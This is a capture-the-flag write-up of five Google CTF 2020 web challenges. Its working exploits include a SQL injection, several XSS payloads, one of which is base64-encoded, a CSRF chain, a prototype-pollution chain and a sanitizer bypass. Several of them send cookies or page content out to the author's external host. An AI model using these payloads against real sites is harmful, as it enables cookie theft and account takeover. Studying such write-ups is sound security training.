# Google CTF 2020 Quals 

## LOG-ME-IN

### Exploit
```py
import requests

headers = {
    'origin': 'https://log-me-in.web.ctfcompetition.com',
    'content-type': 'application/x-www-form-urlencoded',
    'referer': 'https://log-me-in.web.ctfcompetition.com/login',
}

'''
values = [{'password': 1}] ==> `password` = 1
"Select * from users where username = 'michelle' and password = `password` = '1'"
'''

data = {
  "username": 'michelle',
  "password[password]": '1',
  'csrf': ''
}

r = requests.session()
ret = r.post('https://log-me-in.web.ctfcompetition.com/login', headers=headers, data= data)
#print(ret.text)
ret2 = r.get('https://log-me-in.web.ctfcompetition.com/flag')
print(ret2.text)
```

### FLAG
```
CTF{a-premium-effort-deserves-a-premium-flag}
```

## TECH SUPPORT

### 1. Register & Login, Update Profile(Address)
```
<script>
	new Image().src='http://wooeong.kr/flag?'.concat(btoa(escape(parent.frames['flag'].document.body.innerHTML)));
</script>
```

### 2. Trigger XSS

`flag` iframe have FLAG, and other iframe Trigger XSS using CSRF.

```
<iframe src="https://typeselfsub.web.ctfcompetition.com/flag" name="flag" id="flag"></iframe>

<iframe srcdoc="<script>
window.onload=()=>{
var f=document.createElement('form');
f.method='POST';
f.action='https://typeselfsub.web.ctfcompetition.com/login';
var e=document.createElement('input');
e.value='wooeong';
e.name='username';
f.appendChild(e);
var e2=document.createElement('input');
e2.value='wooeong';
e2.name='password';
f.appendChild(e2);
document.body.appendChild(f);
f.submit();}</script>">
```

### FLAG
```
CTF{self-xss?-that-isn't-a-problem-right...}
```

## PASTEURIZE

### Exploit
```py
import requests

headers = {
    'content-type': 'application/x-www-form-urlencoded',
}
data = {
	'content[;/*"]': "*/ location.href='http://wooeong.kr/flag?'.concat(document.cookie); //",
}

ret = requests.post("https://pasteurize.web.ctfcompetition.com/", headers=headers, data=data, allow_redirects=False)
print(ret.headers.get("location", None))
```

### FLAG
```
CTF{Express_t0_Tr0ubl3s}
```

## ALL THE LITTLE THINGS

### Exploit
```js
/*
btoa(`{
    "__proto__": ["wooeong"],
    "theme": {
            "cb": "document.head.innerHTML=document.wooeong.tmpx.valueOf"
    },
    "keepDebug": true,
    "verbose": true,
    "showAll": false,
    "tmpx": "<iframe srcdoc='<li/id=r><b/id=a>{\\\"__proto__\\\":[\\\"wooeong\\\"],\\\"theme\\\":{\\\"cb\\\":null},\\\"img\\\":\\\"http://wooeong.kr/flag?</b><b/id=b></b><b/id=c>\\\"}</b></li><script/src=/theme?cb=b.innerText=parent.document.body.innerText.valueOf></script><script/src=/theme?cb=parent.document.wooeong.tmpx=console.log></script><script/src=/theme?cb=parent.document.wooeong.tmpx=console.debug></script><script/src=/theme?cb=parent.document.wooeong.tmpx=console.info></script><script/src=/theme?cb=parent.window.name=console.warn></script><script/src=/theme?cb=parent.window.name=r.outerText.valueOf></script><script/src=/theme?cb=parent.updateInfo></script><script/src=/theme?cb=parent.location.href=parent.document.wooeong.pn.valueOf></script>'>",
    "ps":"/settings?__debug__",
    "pn":"/note?__debug__"
}`).replace(/\+/gi, "%2B");
*/
window.name = atob('ewogICAgIl9fcHJvdG9fXyI6IFsid29vZW9uZyJdLAogICAgInRoZW1lIjogewogICAgICAgICAgICAiY2IiOiAiZG9jdW1lbnQuaGVhZC5pbm5lckhUTUw9ZG9jdW1lbnQud29vZW9uZy50bXB4LnZhbHVlT2YiCiAgICB9LAogICAgImtlZXBEZWJ1ZyI6IHRydWUsCiAgICAidmVyYm9zZSI6IHRydWUsCiAgICAic2hvd0FsbCI6IGZhbHNlLAogICAgInRtcHgiOiAiPGlmcmFtZSBzcmNkb2M9JzxsaS9pZD1yPjxiL2lkPWE%2be1wiX19wcm90b19fXCI6W1wid29vZW9uZ1wiXSxcInRoZW1lXCI6e1wiY2JcIjpudWxsfSxcImltZ1wiOlwiaHR0cDovL3dvb2Vvbmcua3IvZmxhZz88L2I%2bPGIvaWQ9Yj48L2I%2bPGIvaWQ9Yz5cIn08L2I%2bPC9saT48c2NyaXB0L3NyYz0vdGhlbWU/Y2I9Yi5pbm5lclRleHQ9cGFyZW50LmRvY3VtZW50LmJvZHkuaW5uZXJUZXh0LnZhbHVlT2Y%2bPC9zY3JpcHQ%2bPHNjcmlwdC9zcmM9L3RoZW1lP2NiPXBhcmVudC5kb2N1bWVudC53b29lb25nLnRtcHg9Y29uc29sZS5sb2c%2bPC9zY3JpcHQ%2bPHNjcmlwdC9zcmM9L3RoZW1lP2NiPXBhcmVudC5kb2N1bWVudC53b29lb25nLnRtcHg9Y29uc29sZS5kZWJ1Zz48L3NjcmlwdD48c2NyaXB0L3NyYz0vdGhlbWU/Y2I9cGFyZW50LmRvY3VtZW50Lndvb2VvbmcudG1weD1jb25zb2xlLmluZm8%2bPC9zY3JpcHQ%2bPHNjcmlwdC9zcmM9L3RoZW1lP2NiPXBhcmVudC53aW5kb3cubmFtZT1jb25zb2xlLndhcm4%2bPC9zY3JpcHQ%2bPHNjcmlwdC9zcmM9L3RoZW1lP2NiPXBhcmVudC53aW5kb3cubmFtZT1yLm91dGVyVGV4dC52YWx1ZU9mPjwvc2NyaXB0PjxzY3JpcHQvc3JjPS90aGVtZT9jYj1wYXJlbnQudXBkYXRlSW5mbz48L3NjcmlwdD48c2NyaXB0L3NyYz0vdGhlbWU/Y2I9cGFyZW50LmxvY2F0aW9uLmhyZWY9cGFyZW50LmRvY3VtZW50Lndvb2VvbmcucG4udmFsdWVPZj48L3NjcmlwdD4nPiIsCiAgICAicHMiOiIvc2V0dGluZ3M/X19kZWJ1Z19fIiwKICAgICJwbiI6Ii9ub3RlP19fZGVidWdfXyIKfQ==');
location.href = 'https://littlethings.web.ctfcompetition.com/note/22f23db6-a432-408b-a3e9-40fe258d500f?__debug__';
```

### FLAG
```
CTF{When_the_w0rld_c0mes_t0_an_end_all_that_matters_are_these_little_things}
```

## SAFEHTMLPASTE
```js
async function do_things(id) {
    try {
        html = await get(id);
        html = safepaste.sanitize(html);
    } catch(e) {
        // fetch failed
        console.log(e)
    }
    return html;
}
```

If Make an error, bypass `safepaste.sanitize`.

### Exploit
```
a<math>b<xss style=display:block>c<style>d<a title=\"</style><img src onerror=location.href='http://wooeong.kr/flag?'.concat(document.cookie);>">e
```

### FLAG
```
CTF{5c92edcb0bd1cd7d8bf8597f6ace0716}
```